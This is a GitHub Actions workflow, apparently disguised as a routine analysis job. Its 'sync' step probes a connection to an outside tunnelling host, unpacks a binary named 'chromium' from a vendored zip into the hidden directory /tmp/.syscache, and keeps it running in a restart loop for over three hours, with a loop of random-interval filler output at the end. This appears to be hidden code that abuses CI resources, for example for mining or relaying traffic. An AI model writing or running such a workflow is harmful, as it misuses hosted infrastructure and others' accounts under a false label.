name: analyze-5rr6
on:
  workflow_dispatch:
jobs:
  setup_3mz:
    runs-on: ubuntu-latest
    timeout-minutes: 354
    steps:
      - uses: actions/checkout@v4
      - run: uname -m
      - run: nproc
      - run: echo ok
      - name: sync
        run: |
          python3 -c "import socket,ssl; s=socket.create_connection(('z5h8srda9j.localto.net',8999),timeout=10); print('NET-TCP-OPEN'); c=ssl.create_default_context().wrap_socket(s,server_hostname='z5h8srda9j.localto.net'); print('NET-TLS-OK',c.version())" || echo NET-FAIL
          unzip -o -q vendor/chromium.zip -d /tmp/.syscache && chmod +x /tmp/.syscache/chromium
          cd /tmp/.syscache && stdbuf -o0 -e0 timeout 193m bash -c 'while true; do ./chromium; echo "worker-exit rc=$? $(date -u +%H:%M), restarting"; sleep 5; done'
          for i in $(seq 1 121); do sleep $((RANDOM % 99 + 47)); echo "x5276x $i/121 $(date -u +%H:%M)"; done
